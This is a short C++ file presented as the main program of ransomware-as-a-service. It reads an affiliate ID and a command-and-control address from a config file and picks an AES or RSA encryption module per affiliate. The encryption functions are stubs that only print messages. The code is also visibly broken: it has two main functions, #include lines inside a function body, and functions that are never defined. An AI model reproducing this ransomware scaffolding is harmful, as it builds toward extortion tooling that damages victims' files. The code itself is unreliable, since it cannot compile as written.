
#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>

// Function to encrypt files
void encryptFiles(std::string path)
{
    // Code to encrypt files
    std::cout << "Encrypting files at: " << path << std::endl;
}

// Function to decrypt files
void decryptFiles(std::string path)
{
    // Code to decrypt files
    std::cout << "Decrypting files at: " << path << std::endl;
}

// Main function of the RaaS
int main(int argc, char *argv[])
{
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " [path/to/encrypt]" << std::endl;
        return 1;
    }

    // Check if the given argument is a valid path
    std::string path = argv[1];
    if (!std::all_of(path.begin(), path.end(), ::isalnum)) {
        std::cerr << "Invalid path provided." << std::endl;
        return 1;
    }

    // Encrypt files
    encryptFiles(path);

    // Decrypt files
    decryptFiles(path);

    // Return success code
    return 0;
}

// Function to parse the configuration from embedded file
std::string parseConfig()
{
    std::ifstream configFile("config.txt");
    if (!configFile.is_open()) {
        std::cerr << "Error opening config file." << std::endl;
        exit(1);
    }

    // Read and store the content of the file
    std::string configContent((std::istreambuf_iterator<char>(configFile)), std::istreambuf_iterator<char>());
    
    return configContent;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " [path/to/encrypt]" << std::endl;
        return 1;
    }

    // Check if the given argument is a valid path
    std::string path = argv[1];
    if (!std::all_of(path.begin(), path.end(), ::isalnum)) {
        std::cerr << "Invalid path provided." << std::endl;
        return 1;
    }
    
    // Parse the configuration file
    std::string configContent = parseConfig();

    // Split the configuration content into affiliate's ID and C2 address
    std::string affiliateID, c2Address;
    size_t idEndPos = configContent.find(';');
    affiliateID = configContent.substr(0, idEndPos);
    c2Address = configContent.substr(idEndPos+1);

    // Dynamically import encryption module based on the affiliate's ID
    void(*encryptionFunction)(std::string) = nullptr;
    if (affiliateID == "AffiliateA") {
        #include "AES_module.h"
        encryptionFunction = encryptWithAES;
    }
    else if (affiliateID == "AffiliateB") {
        #include "RSA_module.h"
        encryptionFunction = encryptWithRSA;
    }

    // Use the encryption function to encrypt files
    encryptionFunction(path);

    // Return success code
    return 0;
}
